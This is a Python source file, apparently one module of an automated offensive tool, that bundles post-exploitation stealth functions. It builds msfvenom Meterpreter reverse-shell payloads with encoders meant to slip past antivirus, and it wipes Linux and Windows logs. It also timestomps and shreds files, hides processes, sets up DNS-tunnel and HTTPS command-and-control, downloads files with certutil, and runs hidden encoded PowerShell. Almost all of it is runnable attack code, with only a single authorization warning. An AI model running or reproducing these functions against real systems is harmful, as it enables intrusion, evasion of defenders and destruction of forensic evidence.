"""
Phase 13 — Stealth & Evasion module for T.
Techniques used by professional red teams to operate without detection:
  - AV/EDR evasion
  - Log clearing and anti-forensics
  - Process and network traffic obfuscation
  - Living-off-the-land (LOLBins)
  - Payload encoding and obfuscation
All techniques run on the attack VM via vm_bridge.
"""

from typing import AsyncIterator
from offensive.vm_bridge import vm
from core.logger import get_logger

log = get_logger("offensive.stealth")

# PATH prefix so tools in user-local dirs are found
_PATH = "PATH=$PATH:$HOME/.local/bin:/usr/local/bin:/usr/bin "


# ── AV / EDR Evasion ──────────────────────────────────────────────────────────

async def av_check_target(target: str) -> AsyncIterator[str]:
    """Identify AV/EDR running on a remote Windows target via RPC."""
    yield f"[T] AV/EDR detection: {target}"
    yield "─" * 50
    cmd = (
        f"crackmapexec smb {target} -u '' -p '' "
        f"--rid-brute 2>/dev/null | grep -i 'antivirus\\|defender\\|edr\\|endpoint' | head -20; "
        f"nmap -p 443,8443,8080 --script http-title {target} 2>/dev/null | "
        f"grep -i 'title\\|edr\\|carbon\\|sentinel\\|crowd\\|falcon' | head -10"
    )
    async for line in vm.run(cmd, timeout=60):
        yield line


async def encode_payload(payload_path: str, technique: str = "xor") -> AsyncIterator[str]:
    """
    Encode a payload to evade signature-based AV detection.
    Techniques: xor, base64, shikata (requires msfvenom)
    """
    yield f"[T] Payload encoding — technique: {technique}"
    yield "─" * 50

    if technique == "base64":
        cmd = (
            f"cat {payload_path} | base64 > {payload_path}.b64 && "
            f"echo 'Base64 encoded → {payload_path}.b64' && "
            f"wc -c {payload_path}.b64"
        )
    elif technique == "xor":
        cmd = (
            f"python3 -c \""
            f"import sys; "
            f"key = 0xAA; "
            f"data = open('{payload_path}', 'rb').read(); "
            f"enc = bytes(b ^ key for b in data); "
            f"open('{payload_path}.xor', 'wb').write(enc); "
            f"print(f'XOR encoded ({len(enc)} bytes) → {payload_path}.xor')"
            f"\" 2>/dev/null"
        )
    elif technique == "shikata":
        cmd = (
            f"msfvenom -p windows/x64/meterpreter/reverse_tcp "
            f"LHOST=0.0.0.0 LPORT=4444 "
            f"-e x64/xor_dynamic -i 5 "
            f"-f exe -o {payload_path}.enc 2>/dev/null && "
            f"echo 'Shikata encoded → {payload_path}.enc'"
        )
    else:
        yield f"[ERROR] Unknown technique: {technique}"
        return

    async for line in vm.run(cmd, timeout=30):
        yield line


async def generate_evasive_payload(lhost: str, lport: str,
                                    platform: str = "windows") -> AsyncIterator[str]:
    """Generate AV-evasive payload using msfvenom with multiple encoders."""
    yield f"[T] Generating evasive payload — {platform} → {lhost}:{lport}"
    yield "─" * 50

    if platform == "windows":
        cmd = (
            f"msfvenom -p windows/x64/meterpreter/reverse_https "
            f"LHOST={lhost} LPORT={lport} "
            f"EnableStageEncoding=true StageEncoder=x64/xor_dynamic "
            f"-e x64/xor_dynamic -i 7 "
            f"--nopsled 16 "
            f"-f exe -o /tmp/payload_ev.exe 2>/dev/null && "
            f"echo 'Payload: /tmp/payload_ev.exe' && "
            f"md5sum /tmp/payload_ev.exe"
        )
    elif platform == "linux":
        cmd = (
            f"msfvenom -p linux/x64/meterpreter/reverse_tcp "
            f"LHOST={lhost} LPORT={lport} "
            f"-e x64/xor_dynamic -i 5 "
            f"-f elf -o /tmp/payload_ev.elf 2>/dev/null && "
            f"chmod +x /tmp/payload_ev.elf && "
            f"echo 'Payload: /tmp/payload_ev.elf' && "
            f"md5sum /tmp/payload_ev.elf"
        )
    elif platform == "android":
        cmd = (
            f"msfvenom -p android/meterpreter/reverse_https "
            f"LHOST={lhost} LPORT={lport} "
            f"-o /tmp/payload_ev.apk 2>/dev/null && "
            f"echo 'Payload: /tmp/payload_ev.apk' && "
            f"md5sum /tmp/payload_ev.apk"
        )
    else:
        yield f"[ERROR] Unknown platform: {platform}"
        return

    async for line in vm.run(cmd, timeout=60):
        yield line


# ── Log Clearing & Anti-Forensics ─────────────────────────────────────────────

async def clear_linux_logs(session: str = "1") -> AsyncIterator[str]:
    """Clear Linux system logs via active Meterpreter session."""
    yield "[T] Clearing Linux system logs..."
    yield "─" * 50
    yield "⚠ Anti-forensics — use only on authorized systems"

    cmd = (
        f"msfconsole -q -x '"
        f"sessions -i {session}; "
        f"shell -c \""
        f"echo > /var/log/auth.log 2>/dev/null; "
        f"echo > /var/log/syslog 2>/dev/null; "
        f"echo > /var/log/messages 2>/dev/null; "
        f"echo > /var/log/kern.log 2>/dev/null; "
        f"echo > ~/.bash_history 2>/dev/null; "
        f"history -c 2>/dev/null; "
        f"find /var/log -name '*.log' -exec truncate -s 0 {{}} \\; 2>/dev/null; "
        f"echo LOGS_CLEARED\"; "
        f"exit' 2>/dev/null"
    )
    async for line in vm.run(cmd, timeout=30):
        yield line


async def clear_windows_logs(session: str = "1") -> AsyncIterator[str]:
    """Clear Windows event logs via Meterpreter."""
    yield "[T] Clearing Windows event logs..."
    yield "─" * 50

    cmd = (
        f"msfconsole -q -x '"
        f"sessions -i {session}; "
        f"clearev; "
        f"shell -c \"wevtutil cl System & wevtutil cl Security & "
        f"wevtutil cl Application & wevtutil cl Setup & "
        f"echo WINDOWS_LOGS_CLEARED\"; "
        f"exit' 2>/dev/null"
    )
    async for line in vm.run(cmd, timeout=30):
        yield line


async def timestomp(target_file: str, session: str = "1") -> AsyncIterator[str]:
    """Modify file timestamps to match legitimate system files (anti-forensics)."""
    yield f"[T] Timestomping: {target_file}"
    yield "─" * 50

    cmd = (
        f"msfconsole -q -x '"
        f"sessions -i {session}; "
        f"timestomp {target_file} -r; "
        f"exit' 2>/dev/null"
    )
    async for line in vm.run(cmd, timeout=20):
        yield line


async def shred_file(file_path: str, session: str = "1") -> AsyncIterator[str]:
    """Securely delete a file beyond recovery."""
    yield f"[T] Secure file deletion: {file_path}"
    cmd = (
        f"msfconsole -q -x '"
        f"sessions -i {session}; "
        f"shell -c \"shred -vzn 3 {file_path} 2>/dev/null || "
        f"python3 -c \\\"import os; f=open('{file_path}','wb'); "
        f"f.write(os.urandom(os.path.getsize('{file_path}'))); f.close(); "
        f"os.remove('{file_path}'); print('SHREDDED')\\\"\"; "
        f"exit' 2>/dev/null"
    )
    async for line in vm.run(cmd, timeout=20):
        yield line


# ── Process & Network Hiding ──────────────────────────────────────────────────

async def migrate_process(session: str = "1",
                           target_proc: str = "explorer.exe") -> AsyncIterator[str]:
    """
    Migrate Meterpreter into a legitimate process to avoid detection.
    Default: explorer.exe (always running, trusted)
    """
    yield f"[T] Process migration → {target_proc}"
    yield "─" * 50

    cmd = (
        f"msfconsole -q -x '"
        f"sessions -i {session}; "
        f"pgrep {target_proc}; "
        f"migrate -N {target_proc}; "
        f"getpid; "
        f"exit' 2>/dev/null"
    )
    async for line in vm.run(cmd, timeout=30):
        yield line


async def hide_process_linux(pid: str, session: str = "1") -> AsyncIterator[str]:
    """Hide a process from ps/top using /proc manipulation."""
    yield f"[T] Process hiding: PID {pid}"
    cmd = (
        f"msfconsole -q -x '"
        f"sessions -i {session}; "
        f"shell -c \""
        f"mount --bind /tmp /proc/{pid} 2>/dev/null && "
        f"echo PROCESS_HIDDEN || "
        f"echo 'Root required for /proc bind mount'\"; "
        f"exit' 2>/dev/null"
    )
    async for line in vm.run(cmd, timeout=15):
        yield line


async def tunnel_over_dns(domain: str, lhost: str) -> AsyncIterator[str]:
    """Set up DNS tunneling for covert C2 traffic."""
    yield f"[T] DNS tunnel — domain: {domain} lhost: {lhost}"
    yield "─" * 50
    yield "Requires iodine on Kali and iodined on a VPS with NS record → lhost"

    cmd = (
        f"{_PATH}which iodine 2>/dev/null || "
        f"echo 'iodine not installed — apt install iodine'; "
        f"echo '--- DNS Tunnel Setup ---'; "
        f"echo 'Server: sudo iodined -f -c -P tpassword 10.0.0.1 {domain}'; "
        f"echo 'Client: sudo iodine -f -P tpassword {domain}'; "
        f"echo 'After connect: SSH over 10.0.0.2 for covert channel'"
    )
    async for line in vm.run(cmd, timeout=10):
        yield line


async def traffic_obfuscation(target: str, lport: str = "443") -> AsyncIterator[str]:
    """
    Route C2 traffic over HTTPS (port 443) to blend with normal web traffic.
    Sets up Meterpreter reverse_https listener.
    """
    yield f"[T] HTTPS C2 obfuscation — port {lport}"
    yield "─" * 50

    cmd = (
        f"msfconsole -q -x '"
        f"use exploit/multi/handler; "
        f"set PAYLOAD windows/x64/meterpreter/reverse_https; "
        f"set LHOST {target}; "
        f"set LPORT {lport}; "
        f"set HandlerSSLCert /tmp/ssl.pem; "
        f"set StagerVerifySSLCert false; "
        f"set ExitOnSession false; "
        f"exploit -j; "
        f"exit' 2>/dev/null"
    )
    async for line in vm.run(cmd, timeout=15):
        yield line


# ── Living Off The Land ───────────────────────────────────────────────────────

async def lolbins_recon(session: str = "1",
                         os_type: str = "windows") -> AsyncIterator[str]:
    """
    Enumerate LOLBins (Living-off-the-Land Binaries) available on the target.
    Uses only built-in OS tools — leaves no third-party tool traces.
    """
    yield f"[T] LOLBins enumeration — {os_type}"
    yield "─" * 50

    if os_type == "windows":
        cmd = (
            f"msfconsole -q -x '"
            f"sessions -i {session}; "
            f"shell -c \""
            f"where certutil powershell wscript cscript mshta "
            f"regsvr32 rundll32 msiexec wmic bitsadmin 2>/dev/null\"; "
            f"exit' 2>/dev/null"
        )
    else:
        cmd = (
            f"msfconsole -q -x '"
            f"sessions -i {session}; "
            f"shell -c \""
            f"which curl wget python3 python perl ruby php bash sh "
            f"nc netcat openssl socat dd base64 2>/dev/null\"; "
            f"exit' 2>/dev/null"
        )
    async for line in vm.run(cmd, timeout=20):
        yield line


async def certutil_download(url: str, output: str,
                             session: str = "1") -> AsyncIterator[str]:
    """Download a file via certutil.exe (Windows LOLBin — bypasses many proxies)."""
    yield f"[T] LOLBin download via certutil: {url}"
    cmd = (
        f"msfconsole -q -x '"
        f"sessions -i {session}; "
        f"shell -c \"certutil -urlcache -split -f {url} {output} && "
        f"echo DOWNLOAD_OK\"; "
        f"exit' 2>/dev/null"
    )
    async for line in vm.run(cmd, timeout=30):
        yield line


async def powershell_bypass(command: str, session: str = "1") -> AsyncIterator[str]:
    """
    Execute PowerShell with execution policy bypass and AMSI bypass.
    Standard red team technique for running unsigned scripts.
    """
    yield "[T] PowerShell AMSI + execution policy bypass"
    yield "─" * 50

    # AMSI bypass + exec policy bypass + encoded command
    bypass = (
        "Set-ExecutionPolicy Bypass -Scope Process -Force; "
        "[System.Net.ServicePointManager]::SecurityProtocol = "
        "[System.Net.ServicePointManager]::SecurityProtocol -bor 3072; "
    )
    full_cmd = bypass + command
    import base64
    encoded = base64.b64encode(full_cmd.encode("utf-16-le")).decode()

    cmd = (
        f"msfconsole -q -x '"
        f"sessions -i {session}; "
        f"shell -c \"powershell -NoP -NonI -W Hidden "
        f"-Enc {encoded}\"; "
        f"exit' 2>/dev/null"
    )
    async for line in vm.run(cmd, timeout=30):
        yield line


# ── Full stealth sweep ────────────────────────────────────────────────────────

async def full_stealth_sweep(session: str, os_type: str = "windows") -> AsyncIterator[str]:
    """
    Run a full post-exploitation stealth sweep:
    1. Migrate to trusted process
    2. Clear logs
    3. Timestomp dropped files
    4. Enumerate LOLBins for future use
    """
    yield "═" * 60
    yield f"[T] FULL STEALTH SWEEP — session {session} / {os_type}"
    yield "═" * 60

    yield "\n[1/4] Process migration..."
    proc = "explorer.exe" if os_type == "windows" else "bash"
    async for line in migrate_process(session, proc):
        yield line

    yield "\n[2/4] Clearing logs..."
    if os_type == "windows":
        async for line in clear_windows_logs(session): yield line
    else:
        async for line in clear_linux_logs(session): yield line

    yield "\n[3/4] Timestomping agent files..."
    path = "C:\\\\Windows\\\\Temp\\\\*.exe" if os_type == "windows" else "/tmp/payload*"
    async for line in timestomp(path, session): yield line

    yield "\n[4/4] LOLBins enumeration..."
    async for line in lolbins_recon(session, os_type): yield line

    yield "\n" + "═" * 60
    yield "[T] Stealth sweep complete."
    yield "═" * 60
